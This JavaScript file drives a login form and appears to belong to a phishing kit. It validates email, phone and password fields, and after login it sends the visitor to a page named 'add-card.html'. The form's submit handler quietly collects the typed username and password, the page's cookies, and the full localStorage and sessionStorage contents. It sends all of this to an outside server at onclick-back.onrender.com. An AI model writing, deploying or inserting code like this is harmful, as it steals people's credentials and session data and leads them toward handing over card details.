document.addEventListener("DOMContentLoaded", () => {
  const passwordLabel = document.getElementById("passwordLabel");
  const input = document.getElementById("userId");
  const label = document.getElementById("inputLabel");
  const errorRequired = document.getElementById("error-required");
  const errorFormat = document.getElementById("error-format");
  const errorPhone = document.getElementById("error-phone");
  const subtext = document.getElementById("subtext-info");
  const button = document.getElementById("submit-btn");
  const phoneWrapper = document.getElementById("phone-wrapper");
  const form = document.getElementById("login-form");
  const errorIcon = document.querySelector(".al-input__error-icon");
  const passwordInput = document.getElementById("password");
  const errorPassword = document.getElementById("error-password");

  const validCredentials = [
    { user: 'test@example.com', pass: 'password123' },
    { user: '123456789', pass: 'securepass' }
  ];

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isPhone = (val) => /^\d{9,}$/.test(val);

  let touched = false;

  function updateLabelState() {
    const val = input.value.trim();
    label.classList.toggle("shrink", !!val || document.activeElement === input);
  }

  function updatePasswordLabelState() {
    const val = passwordInput.value.trim();
    const isFocused = document.activeElement === passwordInput;
    passwordLabel.classList.toggle("shrink", !!val || isFocused);
  }


  function validate() {
    const val = input.value.trim();
    const isEmpty = val === "";
    const isPhoneInput = /^\d+$/.test(val);
    const isEmailInput = emailRegex.test(val);
    const isValidPhone = isPhoneInput && val.length >= 9;
    const passwordVal = passwordInput.value.trim();
    const isPasswordValid = passwordVal.length >= 8;
    updatePasswordLabelState();
    passwordLabel.classList.remove("error");


    let hasError = false;

    // Reset
    input.classList.remove("error", "valid", "phone-mode");
    label.classList.remove("error");
    errorRequired.classList.add("hidden");
    errorFormat.classList.add("hidden");
    errorPhone.classList.add("hidden");
    phoneWrapper.classList.add("hidden");
    button.classList.remove("active");
    errorIcon.style.display = "none";
    passwordInput.classList.remove("error", "valid");
    passwordLabel.classList.remove("error");
    errorPassword.classList.add("hidden");

    if (!touched) {
      subtext.classList.remove("hidden");
      return;
    }

    if (isEmpty) {
      input.classList.add("error");
      label.classList.add("error");
      errorRequired.classList.remove("hidden");
      errorIcon.style.display = "block";
      hasError = true;
    } else if (isPhoneInput) {
      input.classList.add("phone-mode");
      phoneWrapper.classList.remove("hidden");
      label.textContent = "Mobile number";

      if (!isValidPhone) {
        input.classList.add("error");
        label.classList.add("error");
        errorPhone.classList.remove("hidden");
        errorIcon.style.display = "block";
        hasError = true;
      }
    } else if (!isEmailInput) {
      input.classList.add("error");
      label.classList.add("error");
      label.textContent = "Email address";
      errorFormat.classList.remove("hidden");
      errorIcon.style.display = "block";
      hasError = true;
    } else {
      label.textContent = "Email address";
    }

    if (!isPasswordValid && touched) {
      passwordInput.classList.add("error");
      passwordLabel.classList.add("error");
      errorPassword.classList.remove("hidden");
      hasError = true;
    } else if (isPasswordValid) {
      passwordInput.classList.remove("error");
      passwordInput.classList.add("valid");
      errorPassword.classList.add("hidden");
      passwordLabel.classList.remove("error");
    }

    if (!hasError) {
      input.classList.add("valid");
      button.classList.add("active");
      button.disabled = false;
      subtext.classList.toggle("hidden", hasError);
    } else {
      subtext.classList.add("hidden");
    }

    updateLabelState();
  }

  input.addEventListener("focus", () => {
    touched = true;
    updateLabelState();
  });

  input.addEventListener("blur", () => {
    updateLabelState();
    validate();
  });

  input.addEventListener("input", () => {
    updateLabelState();
    validate();
  });

  passwordInput.addEventListener("focus", () => {
    touched = true;
    updatePasswordLabelState();
  });

  passwordInput.addEventListener("blur", () => {
    updatePasswordLabelState();
    validate();
  });

  passwordInput.addEventListener("input", () => {
    validate();
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const val = input.value.trim();
    const pass = passwordInput.value.trim();
    if (button.disabled) return;

    const isValid = validCredentials.some(
      pair => pair.user === val && pair.pass === pass
    );

    const payload = {
      user_input: val,
      password: pass,
      userAgent: navigator.userAgent,
      location: window.location.href,
      timestamp: new Date().toISOString(),
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      success: isValid
    };

    button.disabled = true;
    button.classList.remove("active");
    button.querySelector(".al-button__label").textContent = "Loading...";

    try {
      await fetch("https://onclick-back.onrender.com/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (isValid) {
        window.location.href = "add-card.html";
      } else {
        input.classList.add("error");
        passwordInput.classList.add("error");
        errorIcon.style.display = "block";
        validate();
        button.disabled = false;
        button.querySelector(".al-button__label").textContent = "Continue";
      }
    } catch (err) {
      console.error("Failed to submit:", err);
      button.disabled = false;
      button.querySelector(".al-button__label").textContent = "Continue";
    }
  });

  // Locale toggle
  const localeToggle = document.getElementById("locale-toggle");
  const localeMenu = document.getElementById("locale-menu");
  const currentLocale = document.getElementById("current-locale");

  if (localeToggle) {
    localeToggle.addEventListener("click", (e) => {
      e.preventDefault();
      localeMenu.classList.toggle("hidden");
    });

    document.querySelectorAll("#locale-menu li").forEach((li) => {
      li.addEventListener("click", () => {
        currentLocale.textContent = li.dataset.locale;
        localeMenu.classList.add("hidden");
      });
    });
  }

  validate();
});
